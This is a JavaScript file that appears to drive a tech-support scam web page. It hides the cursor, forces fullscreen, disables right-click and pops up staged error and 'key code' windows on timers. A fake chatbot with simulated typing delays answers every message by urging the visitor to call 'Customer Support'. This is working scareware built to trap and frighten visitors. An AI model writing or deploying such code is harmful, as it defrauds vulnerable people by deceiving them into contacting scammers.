
document.addEventListener('mousemove', function (event) {
  const firstPopup = document.querySelector('#firstPopup');
  const secondPopup = document.querySelector('#secondPopup');
  const mobileScreen = document.querySelector('#mobileScreen');
  const keyCodePopup = document.querySelector('#keyCodePopup');
  const cursorStyle = (firstPopup.contains(event.target) || secondPopup.contains(event.target) || keyCodePopup.contains(event.target) || mobileScreen.contains(event.target)) ? 'auto' : 'none';
  document.body.style.cursor = cursorStyle;
});

// Assuming popupContainer is your popup element
const popupContainer = document.querySelector('.popup-container');
popupContainer.classList.add('show-popup');

function showBlueDescriptionPopupWithDelay() {
setTimeout(function () {
const blueDescriptionPopup = document.querySelector('#blueDescriptionPopup');
blueDescriptionPopup.style.display = 'block';
}, 1700); // 3000 milliseconds (3 seconds) delay
}
showBlueDescriptionPopupWithDelay();
// Initially, set errorTelecast display to 'none'
document.getElementById('errorTelecast').style.display = 'none';

// Function to show errorTelecast
function showerrorTelecast() {
document.getElementById('errorTelecast').style.display = 'block';
}

function closeFirstPopup() {
const firstPopup = document.querySelector('#firstPopup');
firstPopup.style.display = 'none';
simulateF11Key();
showBlueDescriptionPopup();
showDisclaimerPopup();
showerrorTelecast(); // Call the function to show errorTelecast after firstPopup is closed
}

function changeBackground() {
document.body.style.backgroundImage = "url('https://wallpapercave.com/wp/wp5493583.jpg')";
}


function showDisclaimerPopup() {
const disclaimerPopup = document.querySelector('#disclaimerPopup');
disclaimerPopup.style.display = 'block';
}

function cancelFirstPopup() {
  closeFirstPopup();
}

function okFirstPopup() {
  closeFirstPopup();
}


function simulateF11Key() {
const element = document.documentElement;



if (element.requestFullscreen) {
  element.requestFullscreen();
} else if (element.mozRequestFullScreen) {
  element.mozRequestFullScreen();
} else if (element.webkitRequestFullscreen) {
  element.webkitRequestFullscreen();
}
}

function showBlueDescriptionPopup() {
const blueDescriptionPopup = document.querySelector('#blueDescriptionPopup');
blueDescriptionPopup.style.display = 'block';

// Use showSupportNotificationWithDelay with 4000 milliseconds delay
showSupportNotificationWithDelay(10000);

setTimeout(function() {
showSecondPopup();
showKeyCodePopup();
}, 3000);
}

function showSecondPopup() {
const secondPopup = document.querySelector('#secondPopup');
secondPopup.style.display = 'block';
}

// The modified showSupportNotificationWithDelay function
function showSupportNotificationWithDelay(delay) {
setTimeout(function() {
const supportNotification = document.querySelector('#supportNotification');
supportNotification.style.display = 'block';
}, delay);
}


function hideSecondPopup() {
  const secondPopup = document.querySelector('#secondPopup');
  secondPopup.style.display = 'none';
  setTimeout(function() {
      showSecondPopup();
  }, 1500);
}

function showKeyCodePopup() {
  const keyCodePopup = document.querySelector('#keyCodePopup');
  keyCodePopup.style.display = 'block';
  keyCodePopup.style.zIndex = '10001'; // Place it on top of other popups
}

// Function to handle key and code submission (you can add your logic here)
function submitKeyCode() {
  // Display the loading animation while processing
  const loadingAnimation = document.querySelector('#loadingAnimation');
  loadingAnimation.style.display = 'block';

  // Simulate a delay (replace this with your actual processing logic)
  setTimeout(function() {
      // Hide the loading animation
      loadingAnimation.style.display = 'none';

      // Hide the toast notification after 2 seconds
      const toastNotification = document.querySelector('#toastNotification');
      toastNotification.style.display = 'block';
      setTimeout(function() {
          toastNotification.style.display = 'none';
      }, 2000)

  }, 2500);
}



function closeSecondPopup() {
  const secondPopup = document.querySelector('#secondPopup');
  secondPopup.style.display = 'none';
}
document.addEventListener('contextmenu', function(event) {
event.preventDefault();
});

 //chatbot//
 "use strict"
 const chatInput = document.querySelector(".chatbot-input textarea");
 const sendChatBtn = document.querySelector(".chatbot-input button");
 const chatBox = document.querySelector(".chatbox");
 const chatbotToggler = document.querySelector(".chatbot-toggler");
 const main = document.getElementById("main");
 let userMessage;

 const sendMessages = (message, className) => {
     // Create a chat <li> element with passed message and className
     const chatLi = document.createElement("li");
     chatLi.classList.add("chat", className);
     let chatContent = className === "outgoing" ? `<p>${message}</p>` : `<span class="material-symbols-outlined">smart_toy</span><p>${message}</p>`
     chatLi.innerHTML = chatContent;
     return chatLi;
 }

 function getRandomSupportResponse() {
     const responses = [
       "We understand the technical challenges you're facing. To ensure a swift resolution, please call our technical support immediately.",
       "Apologies for the technical inconvenience. If you're encountering issues, our dedicated technical support team is ready to assist. Call Customer Support.",
       "Technical hiccups can be frustrating. Connect with our skilled technical support team by calling Customer Support for personalized assistance.",
       "We're sorry for any technical disruptions you're experiencing. Call our Customer Support, and we'll work together to find a solution.",
       "Your technical concerns matter to us. Reach out to our expert technical support team  for immediate assistance.",
       "If technical issues are causing inconvenience, don't hesitate to call our Customer Support. We're here to provide the help you need.",
       "To ensure your technical challenges are resolved efficiently, contact our Customer Support. We appreciate your understanding.",
       "Sorry for the technical troubles you're encountering. Call Customer Support for specialized technical support and a prompt resolution.",
       "We empathize with the frustration that technical issues can bring. For personalized technical assistance, call our Customer Support.",
       "Experiencing technical difficulties? Our technical support team is ready to assist. Call Customer Support for expert guidance and support."
     ];
     const randomIndex = Math.floor(Math.random() * responses.length);
     return responses[randomIndex];
 }

 function handleSuggestion(suggestion) {
     let time = Math.floor(Math.random()*7500)
     if(!suggestion) return;

     chatBox.appendChild(sendMessages(`${suggestion}`, 'outgoing'));
     chatBox.appendChild(sendMessages("Typing...", "incoming"));
     chatBox.scrollTop = chatBox.scrollHeight;
     setTimeout(() => {
         chatBox.replaceChild(sendMessages(`${getSupportResponse(suggestion)}`, "incoming"), chatBox.lastElementChild)
     },time);
     chatBox.scrollTo(0, chatBox.scrollHeight);
 }

 function getSupportResponse(suggestion) {
     if (suggestion.includes('access my account')) {
         return "Certainly! To assist with accessing your account, please call our Customer Support.";
     } else if (suggestion.includes('technical assistance')) {
         return "Of course! For technical assistance, call our Customer Support for personalized help.";
     } else if (suggestion.includes('install updates on my system')) {
         return "To ensure your system is up to date, please call our Customer Support for step-by-step guidance.";
     } else {
         return "I'm sorry, I don't have the information. Let me connect you to a human agent.";
     }
 }


 const handleUserMessage = () => {
     let time = Math.floor(Math.random()*7500)
     let botResponse = getRandomSupportResponse();
     userMessage = chatInput.value.trim();
     if(!userMessage) return;

     chatBox.appendChild(sendMessages(userMessage, "outgoing"));
     chatBox.appendChild(sendMessages("Typing...", "incoming"));
     setTimeout(() => {
         chatBox.replaceChild(sendMessages(botResponse, 'incoming'), chatBox.lastElementChild);
     },time);
     chatBox.scrollTo(0, chatBox.scrollHeight);
     chatInput.value = "";
 }


 sendChatBtn.addEventListener("click", handleUserMessage)
 chatInput.addEventListener('keyup', (e)=>{
     if(e.key === 'Enter'){
         handleUserMessage()
     }

 })

 chatbotToggler.addEventListener("click", ()=> main.classList.toggle("show-chatbot"))
